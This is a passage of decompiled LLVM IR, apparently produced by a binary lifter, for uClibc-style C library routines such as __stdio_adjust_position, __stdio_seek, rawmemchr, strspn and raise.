  uselistorder i32 22, { 2, 13, 3, 11, 4, 12, 5, 6, 7, 15, 8, 14, 9, 10, 0, 1 }
  uselistorder i32* @r30, { 14, 15, 16, 3, 17, 18, 19, 50, 51, 4, 20, 21, 22, 23, 24, 5, 63, 64, 65, 66, 6, 56, 67, 78, 68, 69, 13, 0, 53, 7, 54, 55, 57, 58, 59, 60, 61, 62, 52, 70, 71, 72, 73, 74, 75, 76, 8, 77, 25, 26, 27, 9, 28, 29, 30, 31, 32, 33, 34, 1, 36, 12, 37, 10, 38, 39, 35, 40, 41, 42, 43, 11, 44, 2, 45, 46, 47, 48, 49 }
  uselistorder label %dec_label_pc_1000d8b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d8a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d8a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d854, { 1, 0 }
  uselistorder label %dec_label_pc_1000d81c, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_1000d8e8 = load i16, i16* %arg1, align 2
  %v4_1000d8e8 = zext i16 %v3_1000d8e8 to i32
  %tmp9 = urem i16 %v3_1000d8e8, 4
  %v3_1000d8ec = icmp eq i16 %tmp9, 0
  br i1 %v3_1000d8ec, label %dec_label_pc_1000d938, label %dec_label_pc_1000d8f4

dec_label_pc_1000d8f4:                            ; preds = %entry
  %v1_1000d8ec = zext i16 %tmp9 to i32
  %v1_1000d8f4 = add nsw i32 %v1_1000d8ec, -1
  store i32 %v1_1000d8f4, i32* %r10.global-to-local, align 4
  %v4_1000d8f4 = icmp eq i32 %v1_1000d8f4, 0
  br i1 %v4_1000d8f4, label %dec_label_pc_1000d938, label %dec_label_pc_1000d8fc

dec_label_pc_1000d8fc:                            ; preds = %dec_label_pc_1000d8f4
  %v1_1000d8fc = and i32 %v4_1000d8e8, 2048
  %v3_1000d8fc = icmp eq i32 %v1_1000d8fc, 0
  br i1 %v3_1000d8fc, label %dec_label_pc_1000d938, label %dec_label_pc_1000d904

dec_label_pc_1000d904:                            ; preds = %dec_label_pc_1000d8fc
  %v2_1000d904 = icmp sgt i32 %v1_1000d8f4, 1
  br i1 %v2_1000d904, label %dec_label_pc_1000d9b0, label %dec_label_pc_1000d90c

dec_label_pc_1000d90c:                            ; preds = %dec_label_pc_1000d904
  %v2_1000d90c = add i32 %tmp, 40
  %v3_1000d90c = inttoptr i32 %v2_1000d90c to i32*
  %v4_1000d90c = load i32, i32* %v3_1000d90c, align 4
  %v3_1000d910 = icmp eq i32 %v4_1000d90c, 0
  br i1 %v3_1000d910, label %dec_label_pc_1000d918, label %dec_label_pc_1000d9b0

dec_label_pc_1000d918:                            ; preds = %dec_label_pc_1000d90c
  %v2_1000d918 = add i32 %tmp, 44
  %v3_1000d918 = inttoptr i32 %v2_1000d918 to i32*
  %v4_1000d918 = load i32, i32* %v3_1000d918, align 4
  %v2_1000d91c = add i32 %tmp, 3
  %v3_1000d91c = inttoptr i32 %v2_1000d91c to i8*
  %v4_1000d91c = load i8, i8* %v3_1000d91c, align 1
  %v5_1000d91c = zext i8 %v4_1000d91c to i32
  %v2_1000d924 = sub nsw i32 %v1_1000d8f4, %v5_1000d91c
  %v1_1000d928 = add nsw i32 %v2_1000d924, -1
  store i32 %v1_1000d928, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_1000d918, 1
  br i1 %tmp7, label %dec_label_pc_1000d938, label %dec_label_pc_1000d930

dec_label_pc_1000d930:                            ; preds = %dec_label_pc_1000d918
  %v2_1000d930 = add i32 %tmp, 2
  %v3_1000d930 = inttoptr i32 %v2_1000d930 to i8*
  %v4_1000d930 = load i8, i8* %v3_1000d930, align 1
  %v5_1000d930 = zext i8 %v4_1000d930 to i32
  %v2_1000d934 = sub nsw i32 %v1_1000d928, %v5_1000d930
  store i32 %v2_1000d934, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d938

dec_label_pc_1000d938:                            ; preds = %dec_label_pc_1000d918, %dec_label_pc_1000d8fc, %dec_label_pc_1000d8f4, %entry, %dec_label_pc_1000d930
  %v0_1000d95c = phi i32 [ %v1_1000d928, %dec_label_pc_1000d918 ], [ %v1_1000d8f4, %dec_label_pc_1000d8fc ], [ 0, %dec_label_pc_1000d8f4 ], [ 0, %entry ], [ %v2_1000d934, %dec_label_pc_1000d930 ]
  %v1_1000d938 = and i32 %v4_1000d8e8, 64
  %v3_1000d938 = icmp eq i32 %v1_1000d938, 0
  %storemerge.in.in.v = select i1 %v3_1000d938, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1000d94c = add i32 %tmp, 16
  %v3_1000d94c = inttoptr i32 %v2_1000d94c to i32*
  %v4_1000d94c = load i32, i32* %v3_1000d94c, align 4
  %v1_1000d950 = inttoptr i32 %arg2 to i32*
  %v2_1000d950 = load i32, i32* %v1_1000d950, align 4
  store i32 %v2_1000d950, i32* %r4.global-to-local, align 4
  %v2_1000d954 = sub i32 %storemerge, %v4_1000d94c
  %v1_1000d958 = add i32 %arg2, 4
  %v2_1000d958 = inttoptr i32 %v1_1000d958 to i32*
  %v3_1000d958 = load i32, i32* %v2_1000d958, align 4
  store i32 %v3_1000d958, i32* %r5.global-to-local, align 4
  %v2_1000d95c = add i32 %v2_1000d954, %v0_1000d95c
  store i32 %v2_1000d95c, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_1000d95c, 0
  %v1_1000d964 = zext i1 %tmp10 to i32
  %v2_1000d964 = ashr i32 %v2_1000d95c, 31
  %v3_1000d964 = and i32 %v2_1000d964, -2
  %v4_1000d964 = or i32 %v3_1000d964, %v1_1000d964
  %v2_1000d968 = sub i32 %v3_1000d958, %v2_1000d95c
  %v3_1000d968 = sub i32 -1, %v2_1000d95c
  store i32 %v2_1000d968, i32* %r10.global-to-local, align 4
  %v6_1000d968 = icmp ule i32 %v2_1000d968, %v3_1000d968
  %v2_1000d96c = sub nsw i32 -1, %v4_1000d964
  %v3_1000d96c = add i32 %v2_1000d950, %v2_1000d96c
  %v5_1000d96c = zext i1 %v6_1000d968 to i32
  %v6_1000d96c = add i32 %v3_1000d96c, %v5_1000d96c
  store i32 %v6_1000d96c, i32* %v1_1000d950, align 4
  %v0_1000d974 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d974 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000d974 = add i32 %v1_1000d974, 4
  %v3_1000d974 = inttoptr i32 %v2_1000d974 to i32*
  store i32 %v0_1000d974, i32* %v3_1000d974, align 4
  %v0_1000d978 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000d978 = inttoptr i32 %v0_1000d978 to i32*
  %v2_1000d978 = load i32, i32* %v1_1000d978, align 4
  %v1_1000d97c = load i32, i32* %r4.global-to-local, align 4
  %v3_1000d97c = icmp sgt i32 %v2_1000d978, %v1_1000d97c
  br i1 %v3_1000d97c, label %dec_label_pc_1000d994, label %dec_label_pc_1000d984

dec_label_pc_1000d984:                            ; preds = %dec_label_pc_1000d938
  %v4_1000d97c = icmp eq i32 %v2_1000d978, %v1_1000d97c
  br i1 %v4_1000d97c, label %dec_label_pc_1000d988, label %dec_label_pc_1000d998thread-pre-split

dec_label_pc_1000d988:                            ; preds = %dec_label_pc_1000d984
  %v1_1000d988 = add i32 %v0_1000d978, 4
  %v2_1000d988 = inttoptr i32 %v1_1000d988 to i32*
  %v3_1000d988 = load i32, i32* %v2_1000d988, align 4
  %v1_1000d98c = load i32, i32* %r5.global-to-local, align 4
  %v3_1000d98c = icmp ugt i32 %v3_1000d988, %v1_1000d98c
  br i1 %v3_1000d98c, label %dec_label_pc_1000d994, label %dec_label_pc_1000d998thread-pre-split

dec_label_pc_1000d994:                            ; preds = %dec_label_pc_1000d988, %dec_label_pc_1000d938
  %v0_1000d994 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d994 = sub i32 0, %v0_1000d994
  store i32 %v1_1000d994, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d998

dec_label_pc_1000d998thread-pre-split:            ; preds = %dec_label_pc_1000d984, %dec_label_pc_1000d988
  %v0_1000d998.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d998

dec_label_pc_1000d998:                            ; preds = %dec_label_pc_1000d998thread-pre-split, %dec_label_pc_1000d994
  %v0_1000d998 = phi i32 [ %v0_1000d998.pr, %dec_label_pc_1000d998thread-pre-split ], [ %v1_1000d994, %dec_label_pc_1000d994 ]
  %tmp8 = icmp sgt i32 %v0_1000d998, -1
  br i1 %tmp8, label %dec_label_pc_1000d9b4, label %dec_label_pc_1000d9a0

dec_label_pc_1000d9a0:                            ; preds = %dec_label_pc_1000d998
  %v0_1000d9a0 = call i32 @__errno_location()
  %v2_1000d9a8 = inttoptr i32 %v0_1000d9a0 to i32*
  store i32 75, i32* %v2_1000d9a8, align 4
  %v0_1000d9b8.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d9b4

dec_label_pc_1000d9b0:                            ; preds = %dec_label_pc_1000d90c, %dec_label_pc_1000d904
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d9b4

dec_label_pc_1000d9b4:                            ; preds = %dec_label_pc_1000d998, %dec_label_pc_1000d9a0, %dec_label_pc_1000d9b0
  %v0_1000d9b8 = phi i32 [ %v0_1000d998, %dec_label_pc_1000d998 ], [ %v0_1000d9b8.pre, %dec_label_pc_1000d9a0 ], [ -1, %dec_label_pc_1000d9b0 ]
  ret i32 %v0_1000d9b8

; uselistorder directives
  uselistorder i32 %v2_1000d978, { 1, 0 }
  uselistorder i32 %v2_1000d95c, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 16, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 53, 31, 1, 44, 14, 47, 15, 57, 58, 59, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 54, 55, 56, 7, 8, 45, 46, 9, 10, 2, 4, 3, 11, 13, 48, 49, 50, 51, 12, 0, 52, 5, 6 }
  uselistorder i32 8, { 18, 23, 72, 24, 25, 26, 27, 28, 29, 30, 31, 15, 32, 33, 34, 84, 85, 92, 95, 9, 35, 36, 16, 21, 17, 64, 71, 22, 76, 75, 73, 74, 77, 78, 79, 80, 81, 82, 0, 89, 90, 91, 1, 96, 2, 93, 94, 37, 38, 39, 40, 41, 42, 19, 43, 44, 45, 46, 3, 4, 47, 48, 10, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 8, 5, 86, 87, 88, 59, 60, 61, 62, 63, 11, 6, 12, 13, 7, 14, 65, 20, 66, 67, 68, 69, 70, 83 }
  uselistorder i32 20, { 2, 10, 11, 12, 13, 14, 7, 8, 27, 9, 0, 32, 33, 15, 16, 17, 18, 19, 21, 22, 20, 31, 23, 24, 25, 26, 28, 5, 6, 29, 1, 3, 4, 30 }
  uselistorder i32 64, { 3, 4, 5, 2, 6, 7, 0, 1 }
  uselistorder i32 44, { 5, 6, 8, 7, 0, 1, 2, 3, 4 }
  uselistorder i32 40, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 2048, { 2, 3, 4, 5, 0, 1 }
  uselistorder i16 0, { 4, 0, 5, 1, 2, 3, 6, 7, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_1000d9b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d998thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1000d938, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_1000d9cc = load i32, i32* @lr, align 4
  store i32 %v0_1000d9cc, i32* %r0.global-to-local, align 4
  %v0_1000d9d8 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_1000d9e4 = add i32 %arg1, 4
  %v2_1000d9e4 = inttoptr i32 %v1_1000d9e4 to i32*
  %v3_1000d9e4 = load i32, i32* %v2_1000d9e4, align 4
  %v2_1000d9e8 = load i32, i32* %arg2, align 4
  %v1_1000d9ec = add i32 %tmp, 4
  %v2_1000d9ec = inttoptr i32 %v1_1000d9ec to i32*
  %v3_1000d9ec = load i32, i32* %v2_1000d9ec, align 4
  store i32 268491252, i32* @lr, align 4
  %v4_1000d9f0 = call i32 @__libc_lseek64(i32 %v3_1000d9e4, i32 %v2_1000d9e8, i32 %v3_1000d9ec, i32 %arg3)
  %v1_1000d9f4 = icmp slt i32 %v4_1000d9f0, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_1000d9f4, label %dec_label_pc_1000da0c, label %dec_label_pc_1000da00

dec_label_pc_1000da00:                            ; preds = %entry
  %v1_1000da00 = load i32, i32* @r31, align 4
  %v2_1000da00 = inttoptr i32 %v1_1000da00 to i32*
  store i32 %v4_1000d9f0, i32* %v2_1000da00, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000da08 = load i32, i32* @r31, align 4
  %v2_1000da08 = add i32 %v1_1000da08, 4
  %v3_1000da08 = inttoptr i32 %v2_1000da08 to i32*
  store i32 %tmp, i32* %v3_1000da08, align 4
  %v0_1000da0c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000da0c

dec_label_pc_1000da0c:                            ; preds = %entry, %dec_label_pc_1000da00
  %v0_1000da0c = phi i32 [ %tmp, %entry ], [ %v0_1000da0c.pre, %dec_label_pc_1000da00 ]
  store i32 %v0_1000d9cc, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d9d8, i32* @r31, align 4
  ret i32 %v0_1000da0c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32* @r31, { 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 2, 44, 3, 113, 114, 115, 96, 97, 98, 99, 90, 91, 92, 45, 46, 4, 47, 48, 49, 50, 5, 51, 6, 52, 53, 54, 20, 55, 0, 116, 117, 118, 7, 21, 119, 17, 102, 8, 103, 125, 126, 19, 56, 120, 123, 124, 93, 94, 25, 26, 27, 28, 29, 100, 101, 1, 104, 105, 106, 107, 108, 109, 110, 111, 112, 95, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 57, 58, 59, 60, 61, 10, 62, 9, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 12, 11, 79, 13, 83, 84, 85, 86, 23, 24, 81, 80, 82, 87, 14, 88, 121, 15, 122, 22, 16, 18, 89 }
  uselistorder label %dec_label_pc_1000da0c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000da24 = urem i32 %arg1, 256
  store i32 %v1_1000da24, i32* %r4.global-to-local, align 4
  %v0_1000da3c1 = load i32, i32* @r3, align 4
  %v1_1000da3c2 = urem i32 %v0_1000da3c1, 4
  %v3_1000da3c4 = icmp eq i32 %v1_1000da3c2, 0
  br i1 %v3_1000da3c4, label %dec_label_pc_1000da44, label %dec_label_pc_1000da2c

dec_label_pc_1000da2c:                            ; preds = %entry, %dec_label_pc_1000da2c
  %v1_1000da30 = phi i32 [ %v0_1000da44.pre, %dec_label_pc_1000da2c ], [ %v1_1000da24, %entry ]
  %v0_1000da2c = phi i32 [ %v1_1000da38, %dec_label_pc_1000da2c ], [ %v0_1000da3c1, %entry ]
  %v1_1000da2c = inttoptr i32 %v0_1000da2c to i8*
  %v2_1000da2c = load i8, i8* %v1_1000da2c, align 1
  %v3_1000da2c = zext i8 %v2_1000da2c to i32
  %v4_1000da30 = icmp eq i32 %v3_1000da2c, %v1_1000da30
  %v0_1000da34 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000da30, i32 %v0_1000da34)
  %v0_1000da38 = load i32, i32* @r3, align 4
  %v1_1000da38 = add i32 %v0_1000da38, 1
  store i32 %v1_1000da38, i32* @r3, align 4
  %v1_1000da3c = urem i32 %v1_1000da38, 4
  %v3_1000da3c = icmp eq i32 %v1_1000da3c, 0
  %v0_1000da44.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000da3c, label %dec_label_pc_1000da44, label %dec_label_pc_1000da2c

dec_label_pc_1000da44:                            ; preds = %dec_label_pc_1000da2c, %entry
  %v0_1000da5c9 = phi i32 [ %v0_1000da3c1, %entry ], [ %v1_1000da38, %dec_label_pc_1000da2c ]
  %v0_1000da44 = phi i32 [ %v1_1000da24, %entry ], [ %v0_1000da44.pre, %dec_label_pc_1000da2c ]
  %v1_1000da44 = mul i32 %v0_1000da44, 256
  %v2_1000da4c = or i32 %v1_1000da44, %v0_1000da44
  %v1_1000da54 = mul i32 %v2_1000da4c, 65536
  %v2_1000da58 = or i32 %v1_1000da54, %v2_1000da4c
  br label %dec_label_pc_1000da5c

dec_label_pc_1000da5c:                            ; preds = %dec_label_pc_1000dac8, %dec_label_pc_1000da5c, %dec_label_pc_1000da44
  %v0_1000da98 = phi i32 [ %v0_1000da5c9, %dec_label_pc_1000da44 ], [ %v1_1000da60, %dec_label_pc_1000da5c ], [ %v1_1000da60, %dec_label_pc_1000dac8 ]
  %v1_1000da5c = inttoptr i32 %v0_1000da98 to i32*
  %v2_1000da5c = load i32, i32* %v1_1000da5c, align 4
  %v1_1000da60 = add i32 %v0_1000da98, 4
  %v1_1000da64 = add i32 %v0_1000da98, 2
  %v2_1000da68 = xor i32 %v2_1000da5c, %v2_1000da58
  %v1_1000da70 = add i32 %v2_1000da68, 2130640639
  %v2_1000da74 = xor i32 %v1_1000da70, %v2_1000da68
  %v1_1000da78 = add i32 %v0_1000da98, 1
  %v2_1000da7c = and i32 %v2_1000da74, -2130640640
  %v6_1000da7c = icmp eq i32 %v2_1000da7c, -2130640640
  br i1 %v6_1000da7c, label %dec_label_pc_1000da5c, label %dec_label_pc_1000da88

dec_label_pc_1000da88:                            ; preds = %dec_label_pc_1000da5c
  %v2_1000da88 = inttoptr i32 %v0_1000da98 to i8*
  %v3_1000da88 = load i8, i8* %v2_1000da88, align 1
  %v4_1000da88 = zext i8 %v3_1000da88 to i32
  %v1_1000da8c = add i32 %v0_1000da98, 3
  %v4_1000da90 = icmp eq i32 %v4_1000da88, %v0_1000da44
  br i1 %v4_1000da90, label %dec_label_pc_1000da98, label %dec_label_pc_1000daa0

dec_label_pc_1000da98:                            ; preds = %dec_label_pc_1000da88
  ret i32 %v0_1000da98

dec_label_pc_1000daa0:                            ; preds = %dec_label_pc_1000da88
  %v2_1000daa0 = inttoptr i32 %v1_1000da78 to i8*
  %v3_1000daa0 = load i8, i8* %v2_1000daa0, align 1
  %v4_1000daa0 = zext i8 %v3_1000daa0 to i32
  %v4_1000daa4 = icmp eq i32 %v4_1000daa0, %v0_1000da44
  br i1 %v4_1000daa4, label %dec_label_pc_1000daac, label %dec_label_pc_1000dab4

dec_label_pc_1000daac:                            ; preds = %dec_label_pc_1000daa0
  ret i32 %v1_1000da78

dec_label_pc_1000dab4:                            ; preds = %dec_label_pc_1000daa0
  %v2_1000dab4 = inttoptr i32 %v1_1000da64 to i8*
  %v3_1000dab4 = load i8, i8* %v2_1000dab4, align 1
  %v4_1000dab4 = zext i8 %v3_1000dab4 to i32
  %v4_1000dab8 = icmp eq i32 %v4_1000dab4, %v0_1000da44
  br i1 %v4_1000dab8, label %dec_label_pc_1000dac0, label %dec_label_pc_1000dac8

dec_label_pc_1000dac0:                            ; preds = %dec_label_pc_1000dab4
  ret i32 %v1_1000da64

dec_label_pc_1000dac8:                            ; preds = %dec_label_pc_1000dab4
  %v2_1000dac8 = inttoptr i32 %v1_1000da8c to i8*
  %v3_1000dac8 = load i8, i8* %v2_1000dac8, align 1
  %v4_1000dac8 = zext i8 %v3_1000dac8 to i32
  %v4_1000dacc = icmp eq i32 %v4_1000dac8, %v0_1000da44
  br i1 %v4_1000dacc, label %dec_label_pc_1000dad4, label %dec_label_pc_1000da5c

dec_label_pc_1000dad4:                            ; preds = %dec_label_pc_1000dac8
  ret i32 %v1_1000da8c

; uselistorder directives
  uselistorder i32 %v1_1000da60, { 1, 0 }
  uselistorder i32 %v0_1000da98, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_1000da4c, { 1, 0 }
  uselistorder i32 %v0_1000da44, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000da38, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000da3c1, { 2, 1, 0 }
  uselistorder i32 %v1_1000da24, { 1, 2, 0 }
  uselistorder i32 3, { 1, 28, 2, 0, 8, 15, 40, 3, 29, 30, 16, 31, 32, 26, 41, 42, 27, 45, 33, 12, 4, 5, 34, 43, 44, 6, 50, 51, 52, 46, 47, 48, 49, 10, 36, 35, 7, 11, 17, 18, 37, 13, 19, 14, 20, 21, 38, 39, 22, 23, 24, 25, 9 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 2, { 32, 62, 63, 91, 28, 0, 1, 18, 26, 64, 65, 2, 66, 67, 68, 33, 34, 69, 35, 70, 36, 71, 92, 19, 3, 4, 5, 94, 20, 21, 22, 23, 24, 37, 89, 90, 25, 72, 73, 74, 6, 7, 8, 9, 10, 75, 76, 11, 78, 79, 80, 17, 77, 12, 13, 93, 95, 38, 81, 82, 40, 41, 39, 42, 43, 44, 14, 45, 46, 15, 29, 47, 48, 30, 50, 51, 49, 52, 53, 54, 55, 83, 84, 85, 86, 56, 27, 87, 57, 58, 59, 60, 61, 88, 31, 16 }
  uselistorder i32 65536, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 10, 9, 11, 31, 12, 14, 13, 15, 17, 16, 18, 19, 22, 21, 20, 24, 25, 23, 26, 28, 29, 27, 30 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 10, 20, 22, 17, 11, 1, 2, 3, 4, 5, 0, 21, 12, 13, 14, 15, 6, 7, 8, 16, 24, 23, 9, 18, 19 }
  uselistorder i32 4, { 184, 4, 5, 139, 140, 141, 142, 143, 144, 117, 6, 7, 221, 222, 2, 8, 0, 145, 3, 9, 1, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 223, 158, 89, 237, 244, 10, 11, 12, 13, 14, 15, 224, 225, 16, 226, 17, 227, 18, 19, 133, 20, 21, 134, 22, 185, 186, 187, 193, 194, 195, 23, 135, 24, 25, 26, 136, 27, 137, 138, 201, 203, 202, 199, 200, 204, 205, 206, 207, 208, 209, 210, 211, 212, 28, 159, 29, 100, 228, 229, 160, 30, 31, 32, 101, 33, 105, 220, 34, 35, 197, 36, 37, 238, 239, 240, 118, 241, 242, 243, 38, 230, 231, 232, 87, 88, 233, 234, 119, 235, 236, 39, 161, 40, 41, 42, 43, 44, 45, 46, 162, 47, 163, 164, 102, 165, 166, 167, 168, 169, 48, 49, 170, 171, 103, 172, 173, 104, 174, 175, 177, 50, 51, 85, 86, 176, 52, 53, 90, 54, 179, 55, 91, 56, 57, 178, 58, 59, 60, 180, 181, 182, 120, 183, 121, 61, 92, 112, 122, 62, 93, 123, 106, 113, 124, 63, 94, 125, 107, 108, 114, 109, 115, 126, 110, 111, 131, 64, 65, 188, 127, 189, 190, 191, 192, 95, 66, 96, 67, 196, 68, 128, 116, 129, 69, 97, 130, 98, 70, 99, 71, 72, 198, 73, 74, 75, 213, 76, 214, 77, 215, 78, 216, 79, 217, 80, 218, 81, 219, 82, 83, 84, 132 }
  uselistorder i32 256, { 0, 1, 33, 2, 3, 4, 5, 6, 7, 8, 9, 35, 10, 36, 37, 39, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 38, 21, 22, 23, 24, 25, 26, 27, 28, 34, 29, 30, 31, 32 }
  uselistorder label %dec_label_pc_1000da2c, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000db0c1 = load i32, i32* @r3, align 4
  %v1_1000db0c2 = inttoptr i32 %v0_1000db0c1 to i8*
  %v2_1000db0c3 = load i8, i8* %v1_1000db0c2, align 1
  %v3_1000db106 = icmp eq i8 %v2_1000db0c3, 0
  br i1 %v3_1000db106, label %dec_label_pc_1000db20, label %dec_label_pc_1000db18

dec_label_pc_1000dae8:                            ; preds = %dec_label_pc_1000dae8, %dec_label_pc_1000db18
  %v0_1000dae8 = phi i32 [ %v1_1000daec, %dec_label_pc_1000dae8 ], [ %tmp, %dec_label_pc_1000db18 ]
  %v1_1000dae8 = inttoptr i32 %v0_1000dae8 to i8*
  %v2_1000dae8 = load i8, i8* %v1_1000dae8, align 1
  %v1_1000daec = add i32 %v0_1000dae8, 1
  %v3_1000daf0 = icmp eq i8 %v2_1000dae8, 0
  %v4_1000daf4 = icmp eq i8 %v0_1000daf48.in, %v2_1000dae8
  %brmerge = or i1 %v3_1000daf0, %v4_1000daf4
  br i1 %brmerge, label %dec_label_pc_1000dafc, label %dec_label_pc_1000dae8

dec_label_pc_1000dafc:                            ; preds = %dec_label_pc_1000dae8
  br i1 %v3_1000daf0, label %dec_label_pc_1000db20, label %dec_label_pc_1000db04

dec_label_pc_1000db04:                            ; preds = %dec_label_pc_1000dafc
  %v1_1000db04 = add i32 %v0_1000db04, 1
  %v1_1000db08 = add i32 %v0_1000db08, 1
  %v1_1000db0c = inttoptr i32 %v1_1000db08 to i8*
  %v2_1000db0c = load i8, i8* %v1_1000db0c, align 1
  %v3_1000db10 = icmp eq i8 %v2_1000db0c, 0
  br i1 %v3_1000db10, label %dec_label_pc_1000db20, label %dec_label_pc_1000db18

dec_label_pc_1000db18:                            ; preds = %entry, %dec_label_pc_1000db04
  %v0_1000db08 = phi i32 [ %v1_1000db08, %dec_label_pc_1000db04 ], [ %v0_1000db0c1, %entry ]
  %v0_1000db04 = phi i32 [ %v1_1000db04, %dec_label_pc_1000db04 ], [ 0, %entry ]
  %v0_1000daf48.in = phi i8 [ %v2_1000db0c, %dec_label_pc_1000db04 ], [ %v2_1000db0c3, %entry ]
  br label %dec_label_pc_1000dae8

dec_label_pc_1000db20:                            ; preds = %dec_label_pc_1000db04, %dec_label_pc_1000dafc, %entry
  %v0_1000db20 = phi i32 [ 0, %entry ], [ %v1_1000db04, %dec_label_pc_1000db04 ], [ %v0_1000db04, %dec_label_pc_1000dafc ]
  ret i32 %v0_1000db20

; uselistorder directives
  uselistorder i32 %v0_1000dae8, { 1, 0 }
  uselistorder i8 0, { 25, 24, 15, 14, 3, 27, 26, 16, 28, 29, 0, 30, 31, 32, 33, 4, 1, 5, 34, 35, 36, 38, 39, 40, 41, 37, 42, 6, 43, 44, 45, 46, 48, 49, 50, 51, 47, 52, 2, 7, 8, 9, 10, 11, 12, 54, 53, 13, 55, 56, 57, 58, 59, 61, 17, 62, 63, 60, 64, 65, 66, 67, 69, 68, 70, 73, 71, 72, 74, 77, 75, 76, 78, 79, 80, 81, 82, 83, 84, 85, 87, 86, 89, 88, 90, 18, 92, 91, 23, 93, 19, 94, 96, 97, 95, 20, 98, 99, 22, 100, 21, 101, 102, 103 }
  uselistorder label %dec_label_pc_1000db18, { 1, 0 }
  uselistorder label %dec_label_pc_1000dae8, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000db28 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268491584, i32* @lr, align 4
  %v0_1000db3c = call i32 @__libc_getpid()
  %v0_1000db44 = load i32, i32* @r29, align 4
  store i32 %v0_1000db28, i32* @lr, align 4
  %v2_1000db54 = call i32 @kill(i32 %v0_1000db3c, i32 %v0_1000db44)
  ret i32 %v2_1000db54

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1, 3 }
  uselistorder i32* @r29, { 56, 57, 10, 58, 59, 38, 7, 11, 12, 0, 13, 14, 15, 16, 17, 18, 60, 61, 62, 63, 64, 65, 66, 43, 44, 45, 46, 47, 48, 1, 49, 50, 51, 52, 53, 54, 55, 39, 2, 67, 68, 69, 19, 20, 3, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 4, 6, 5, 33, 9, 31, 32, 34, 35, 70, 71, 72, 73, 36, 37, 40, 8, 41, 42 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000db58 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
